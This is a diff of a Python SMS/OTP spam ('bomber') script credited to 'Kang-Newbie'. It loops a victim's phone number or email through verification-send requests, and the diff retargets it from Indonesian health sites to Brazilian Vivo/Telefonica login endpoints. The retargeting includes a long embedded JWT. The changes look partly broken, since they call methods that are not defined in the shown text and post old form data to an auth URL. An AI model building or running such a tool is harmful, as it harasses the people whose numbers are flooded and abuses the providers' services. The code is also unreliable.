@@ -63,15 +63,15 @@ class docter:
 	def prosehat(self,num):
 		head={
 			'accept': 'application/json, text/javascript, */*; q=0.01',
-			'origin': 'https://www.prosehat.com',
+			'origin': 'https://login.vivo.com.br/loginmarca/appmanager/marca/publico?origem=https://login.vivo.com.br/saml2/idp/sso/login-return#',
 			'x-requested-with': 'XMLHttpRequest',
 			'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
 			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-			'referer': 'https://www.prosehat.com/akun',
+			'referer': 'https://br.mobileconnect.telefonica.com/br/authrouter/authenticate?jwt=eyJraWQiOiJ0ZGFmLWFwaS1hdXRoc2VydmVyIiwiY29yciI6IkFVUy0zNTFiOTBiZS1hYTAwLTQ0MGUtOTE1My0wZWU0NmIyZmFkZTgiLCJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..q4pYZCyh6RklcI-Ac7ZlLA.YMimU4ctFvsEH0c8WRpCsgciFuhhWlFL4qmsBWT6nLMEIXM7Kf-Tf7aoPArZalbmKUJZ5uVccO99WDhbMUdY_cfFcYACLvWoNUmSdme3plGSAlZ9Ba9iEzc3FobKzk5VpAoTR7iZRWhC1yzipUw1Pao2VlUYVsUx4a9YsHbEevL1gS6FLRVGtbhrKYSz2-QGCY6CQXAQfeq7jnJ1cJdtGm3oO1ULt-XQk5Pvjp3-mY3prq-vd9U9dJ_psitORkLrx7PjF1tl9gbJXFWr9XgqKhYOscQx_isVdLtM2COU0GOjyp2DydIIi918czfZzGafti7QOnwnFlRmc1bhKLTlW5yqOiwJlfr39XdzIh0cFEWFybzElD8cIFope8WCKuT7PrF_7Ips9LmjMWeQYoSeCLpY1IeW3KDETy24R8DwXIeRJE4wtTxU02oD2yM0jHRe8IvPR9-I5Vd2717im8KRbGUHsAmb2fcSbLhnbn_pnTir-GZwke0_vrpu83YowpWF.EPeDkxW0kv2dhzbHFwJ0zjqrJBzvbcDiUx70a2OR4gc',
 		}
 		ata={'phone_or_email':num,'action':'ajaxverificationsend'}
 
-		req=requests.post('https://www.prosehat.com/wp-admin/admin-ajax.php',data=ata,headers=head)
+		req=requests.post('https://br.mobileconnect.telefonica.com/br/authrouter/authenticate?jwt=eyJraWQiOiJ0ZGFmLWFwaS1hdXRoc2VydmVyIiwiY29yciI6IkFVUy0zNTFiOTBiZS1hYTAwLTQ0MGUtOTE1My0wZWU0NmIyZmFkZTgiLCJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIn0..q4pYZCyh6RklcI-Ac7ZlLA.YMimU4ctFvsEH0c8WRpCsgciFuhhWlFL4qmsBWT6nLMEIXM7Kf-Tf7aoPArZalbmKUJZ5uVccO99WDhbMUdY_cfFcYACLvWoNUmSdme3plGSAlZ9Ba9iEzc3FobKzk5VpAoTR7iZRWhC1yzipUw1Pao2VlUYVsUx4a9YsHbEevL1gS6FLRVGtbhrKYSz2-QGCY6CQXAQfeq7jnJ1cJdtGm3oO1ULt-XQk5Pvjp3-mY3prq-vd9U9dJ_psitORkLrx7PjF1tl9gbJXFWr9XgqKhYOscQx_isVdLtM2COU0GOjyp2DydIIi918czfZzGafti7QOnwnFlRmc1bhKLTlW5yqOiwJlfr39XdzIh0cFEWFybzElD8cIFope8WCKuT7PrF_7Ips9LmjMWeQYoSeCLpY1IeW3KDETy24R8DwXIeRJE4wtTxU02oD2yM0jHRe8IvPR9-I5Vd2717im8KRbGUHsAmb2fcSbLhnbn_pnTir-GZwke0_vrpu83YowpWF.EPeDkxW0kv2dhzbHFwJ0zjqrJBzvbcDiUx70a2OR4gc',data=ata,headers=head)
 #		print(req.text)
 		if "token" in req.text:
 			print("[•] Berhasil")
@@ -94,9 +94,9 @@ while True:
 		 - By Kang-Newbie -
 
 [ Spam List ]
-1. Alodokter.com
+1. vivo.com
 2. Klikdokter.com
-3. Prosehat.com
+3. meu vivo
 	""")
 		pil=int(input("> Pilih: "))
 		print("="*25)
@@ -107,13 +107,13 @@ while True:
 		main=docter()
 		if pil == 1:
 			for i in range(lop):
-				main.alodoc(num)
+				main.vivo(num)
 		elif pil == 2:
 			for i in range(lop):
 				main.klikdok(num)
 		elif pil == 3:
 			for i in range(lop):
-				main.prosehat(num)
+				main.meuvivo(num)
 		else:
 			print("?: Anda Buta!?")
 
